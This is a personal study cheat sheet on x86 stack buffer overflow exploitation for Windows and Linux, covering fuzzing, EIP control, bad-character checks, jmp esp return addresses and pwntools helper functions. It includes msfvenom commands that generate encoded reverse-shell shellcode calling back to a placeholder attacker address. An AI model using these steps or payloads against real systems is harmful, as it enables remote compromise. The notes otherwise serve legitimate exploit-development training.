# Buffer Overflow
Ref:
- <https://chi_gitbook.gitbooks.io/personal-note/content>
- <https://itandsecuritystuffs.wordpress.com/2014/03/18/understanding-buffer-overflows-attacks-part-1/>
- <https://www.fuzzysecurity.com/tutorials/expDev/1.html>

# Memory stack look like
<https://itandsecuritystuffs.files.wordpress.com/2014/03/image_thumb.png?w=415&h=480>

## Memory operands
### Endian
- Big Endian: Start from high byte in stack (memory)
- Little Endian: Start from low byte in stack (memory)

```
E.g.
data: 0a0b0c0d

Big: 0a0b0c0d
Little: 0d0c0b0a
```

## Windows Protections
### DEP - Data Execution Prevention
checks on memory and prevent code execution
### ASLR - Address Space Layout Randomization
randimize the address of application and dll

### Register
#### General-Purpose Registers
EAX, EBX, ECX, EDX, EBP, ESP, ESI, EDI

### EBP - Extended Base Pointer
- point to base address of the stack

### ESP - Extended Stack Pointer
- point to the top of running process stack
- allow to push and pop the value from the stack
- location of the stack now you are

### EIP - Extended Instruction Pointer
- hold current address location for the instruction being executed
- control the part of code execution


## olleydebug & Immunity Debugger(with mona.py)
F2 -> set break point / double click

# Windows BOF steps using Immunity Debugger(with mona.py)
## 1. Fuzzing
for loop to send

## 2. Control EIP
#### create pattern
`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <fuzzed_number>`

#### find eip location (offset)
`/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <fuzzed_number> -q <eip>`
#### mona find eip
`!mona findmsp`

### pwntools
#### create pattern
`cyclic_metasploit(fuzzed_number)`

#### find eip location (offset)
`cyclic_metasploit_find(eip)`

## 3. Locate Space for shellcode
Right click ESP -> Dump stack -> lower address - higher address = space for shellcode

## 4. Bad characters
```
bad_char = [chr(i) for i in range(1, 256)]
bad_char.remove('\x00')
```
#### And check stack dump

### All bad characters
```
badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
```

#### python
`'\\'.join([ "x{:02x}".format(i) for i in range(1,256) ])`

#### bash
`for i in {1..255}; do printf "\\\x%02x" $i; done; echo -e "\r"`

## 5. Find Return Address
### 5.1 List modules of the OS
`!mona modules`
check: Rebase, SafeSEH, ASLR, NXCompat are False


### 5.2 search opcode hex value
```
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > jmp esp
00000000 FFE4 jmp esp
```

### 5.3 search opcode from a modules
`!mona find -s '<opcode>' -m <module_name>`

### 5.4 check jmp esp R+W
debugger press `m`

### 5.5 jmp to break poing
press `->....` go to the address & set break point

## 6. Generate shellcode
`msfvenom -p windows/shell_reverse_tcp LHOST=<ip_address> LPORT=<port> EXITFUNC=thread -f c –e x86/shikata_ga_nai -b  "\x00\x0a\x0d"`
#### meterpeter payload
`windows/meterpreter/reverse_tcp`

### 6.1 maybe need to add nop
`\x90 * 8 ` or `\x90 * 16`

### 6.2 try more encode methods!
```
TL;DR
--smallest : auto try to find the successed encoding methods
```
##### 6.2.1 all encoder
```
# msfvenom -l encoders
    Name                          Rank       Description                                                                
    ----                          ----       -----------                                                                
    cmd/brace                     low        Bash Brace Expansion Command Encoder                                       
    cmd/echo                      good       Echo Command Encoder                                                       
    cmd/generic_sh                manual     Generic Shell Variable Substitution Command Encoder                        
    cmd/ifs                       low        Bourne ${IFS} Substitution Command Encoder                                 
    cmd/perl                      normal     Perl Command Encoder                                                       
    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder                                          
    cmd/printf_php_mq             manual     printf(1) via PHP magic_quotes Utility Command Encoder                     
    generic/eicar                 manual     The EICAR Encoder                                                         
    generic/none                  normal     The "none" Encoder                                                        
    mipsbe/byte_xori              normal     Byte XORi Encoder                                                         
    mipsbe/longxor                normal     XOR Encoder
    mipsle/byte_xori              normal     Byte XORi Encoder                                                         
    mipsle/longxor                normal     XOR Encoder
    php/base64                    great      PHP Base64 Encoder                                                        
    ppc/longxor                   normal     PPC LongXOR Encoder                                                       
    ppc/longxor_tag               normal     PPC LongXOR Encoder                                                       
    ruby/base64                   great      Ruby Base64 Encoder                                                       
    sparc/longxor_tag             normal     SPARC DWORD XOR Encoder                                                   
    x64/xor                       normal     XOR Encoder
    x64/zutto_dekiru              manual     Zutto Dekiru
    x86/add_sub                   manual     Add/Sub Encoder
    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder                                     
    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder                                     
    x86/avoid_underscore_tolower  manual     Avoid underscore/tolower                                                  
    x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower                                                        
    x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder                            
    x86/bmp_polyglot              manual     BMP Polyglot
    x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder                                                  
    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder                                 
    x86/context_stat              manual     stat(2)-based Context Keyed Payload Encoder                               
    x86/context_time              manual     time(2)-based Context Keyed Payload Encoder                               
    x86/countdown                 normal     Single-byte XOR Countdown Encoder            
    x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder                             
    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder                                   
    x86/nonalpha                  low        Non-Alpha Encoder                                                         
    x86/nonupper                  low        Non-Upper Encoder                                                         
    x86/opt_sub                   manual     Sub Encoder (optimised)                                                   
    x86/service                   manual     Register Service                                                          
    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder                                 
    x86/single_static_bit         manual     Single Static Bit                                                         
    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder                             
    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
```

# Linux BOF using edb Debugger

## 1. Fuzzing
for loop again

## 2. Control EIP
same as above

## 3. Locate Space for shellcode
If the buffer after EIP is too small, we may need to add some opcodes to jump to the header of the buffer.

E.g. EAX locate the header of the Buffer
use nasm_shell to add these opcode after controlled EIP

## 4. Find Return Address
Opcode search ESP->EIP jmp esp

## 5. Bad characters
`bad_char = [chr(i) for i in range(1, 256)]` & check stack dump

## 6. Generate shellcode
`msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip_address> LPORT=<port> EXITFUNC=thread -f c –e x86/shikata_ga_nai -b  "\x00\x0a\x0d"`


# Example functions
```
from pwn import *


def send_payload(payload, ip_addr, port_num, proto="tcp"):
	print("fuzzing PASS with %s bytes" % len(payload))
	conn = remote(ip_addr, port_num, timeout=30, typ=proto)
	conn.recvline()

	print("[+] send OVRFLW")
	conn.sendline(payload)
	conn.recvline()

	# conn.sendline('EXIT')
	conn.close()


def generate_pattern(num):
	pattern = cyclic_metasploit(num)
	return pattern


def find_eip_offset():
	eip = int(raw_input('[?] EIP: '), 16)
	# print(hex(eip))
	offset = cyclic_metasploit_find(eip)
	print('[!] offset: %d' % offset)
	return offset
```
